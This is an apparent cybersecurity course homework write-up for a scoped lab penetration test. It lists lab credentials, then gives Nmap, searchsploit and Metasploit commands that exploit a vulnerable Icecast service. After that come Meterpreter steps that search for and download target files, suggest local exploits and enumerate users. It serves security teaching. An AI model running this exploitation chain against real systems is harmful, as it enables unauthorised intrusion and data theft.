Homework: Penetration Test Engagement
In this activity, you will play the role of an independent penetration tester hired by GoodCorp Inc. to perform security tests against their CEO’s workstation.

The CEO claims to have passwords that are long and complex and therefore unhackable.

You are tasked with gaining access to the CEO's computer and using a Meterpreter session to search for two files that contain the strings recipe and seceretfile.

The deliverable for this engagement will be in the form of a report labeled Report.docx.

Setup
Before you begin, we'll need to start the Icecast server to emulate the CEO's computer.
Log onto the DVW10 machine (credentials IEUser:Passw0rd!) and wait for the Icecast application to popup.
Then click Start Server.
Reminders
A penetration tester's job is not just to gain access and find a file. Pentesters need to find all vulnerabilities, and document and report them to the client. It's quite possible that the CEO's workstation has multiple vulnerabilities.

If a specific exploit doesn't work, that doesn't necessarily mean that the target service isn't vulnerable. It's possible that something could be wrong with the exploit script itself. Remember, not all exploit scripts are right for every situation.

Scope
The scope of this engagement is limited to the CEO's workstation only. You are not permitted to scan any other IP addresses or exploit anything other than the CEO's IP address.

The CEO has a busy schedule and cannot have the computer offline for an extended period of time. Therefore, denial of service and brute force attacks are prohibited.

After you gain access to the CEO’s computer, you may read and access any file, but you cannot delete them. Nor are you allowed to make any configurations changes to the computer.

Since you've already been provided access to the network, OSINT won't be necessary.

Lab Environment
For this week's homework, please use the following VM setup:

Attacking machine: Kali Linux root:toor
Target machine: DVW10 IEUser:Passw0rd!
NOTE: You will need to login to the DVW10 VM and start the icecast service prior to beginning this activity using the following procedure:

After logging into DVW10, type "icecast" in the Cortana search box and hit Enter.
The icecast application will launch.
Click on Start Server.
You are now ready to being the activity.
Deliverable
Once you complete this assignment, submit your findings in the following document:

Report.docx
Instructions
You've been provided full access to the network and are getting ping responses from the CEO’s workstation.

Perform a service and version scan using Nmap to determine which services are up and running:

Run the Nmap command that performs a service and version scan against the target.

Answer: nmap -sS -sV -O 192.168.0.20

![image](https://user-images.githubusercontent.com/93474690/146692260-379634d0-b0c6-4841-82b8-dfe5100c5627.png)

From the previous step, we see that the Icecast service is running. Let's start by attacking that service. Search for any Icecast exploits:

Run the SearchSploit commands to show available Icecast exploits.

Answer: searchsploit icecast

![image](https://user-images.githubusercontent.com/93474690/146692275-23f99b03-d991-4850-b3f8-d621217a108e.png)

Now that we know which exploits are available to us, let's start Metasploit:

Run the command that starts Metasploit:

Answer: msfconsole

Search for the Icecast module and load it for use.

Run the command to search for the Icecast module:

Answer: search icecast

![image](https://user-images.githubusercontent.com/93474690/146692292-9f564f67-863d-4488-bcb8-b12b54320c7d.png)

Run the command to use the Icecast module:

Note: Instead of copying the entire path to the module, you can use the number in front of it.

Answer: use 0

![image](https://user-images.githubusercontent.com/93474690/146692322-b675c9eb-5be4-4970-a8fb-fd71d41eb43e.png)

Set the RHOST to the target machine.

Run the command that sets the RHOST:

Answer: set RHOST 192.168.0.20

![image](https://user-images.githubusercontent.com/93474690/146692340-faaea479-a3f3-4dcf-a0fa-f84298f0aec0.png)
Run the Icecast exploit.

Run the command that runs the Icecast exploit.

Answer: exploit

![image](https://user-images.githubusercontent.com/93474690/146692358-5e730381-32aa-4e97-9fa2-8b15f198e33d.png)

Run the command that performs a search for the secretfile.txt on the target.

Answer: search -f *secretfile*.txt

![image](https://user-images.githubusercontent.com/93474690/146692366-0c4d8306-b8b9-41e1-9493-c0e4c68f440e.png)

You should now have a Meterpreter session open.

Run the command to performs a search for the recipe.txt on the target:

Answer: search -f *recipe*.txt

![image](https://user-images.githubusercontent.com/93474690/146692378-39b92b3e-a1b3-4dae-aad9-f768e42d9fd6.png)

Bonus: Run the command that exfiltrates the recipe*.txt file:

Answer: download ‘c:\Users\IEUser\Documents\Drinks.recipe.txt’

![image](https://user-images.githubusercontent.com/93474690/146692395-df50bb9a-4e70-4f5e-b80b-33e9b248b565.png)

You can also use Meterpreter's local exploit suggester to find possible exploits.

Note: The exploit suggester is just that: a suggestion. Keep in mind that the listed suggestions may not include all available exploits.

Answer: run post/multi/recon/local_exploit_suggester

![image](https://user-images.githubusercontent.com/93474690/146692413-67bb2a30-45e5-44c0-abda-422563529dd4.png)

Bonus
A. Run a Meterpreter post script that enumerates all logged on users.

Answer: run post/windows/gather/enum_logged_on_users

![image](https://user-images.githubusercontent.com/93474690/146692429-d527cd75-0d44-4ced-9d05-9c8c99c4018c.png)

 Open a Meterpreter shell and gather system information for the target.

Answer: shell

![image](https://user-images.githubusercontent.com/93474690/146692446-f395f210-e300-4658-b43f-9205b841e021.png)

. Run the command that displays the target's computer system information:

Answer: sysinfo

![image](https://user-images.githubusercontent.com/93474690/146692480-c8bfaf39-3fc3-4578-a8d9-57031f3e02d7.png)
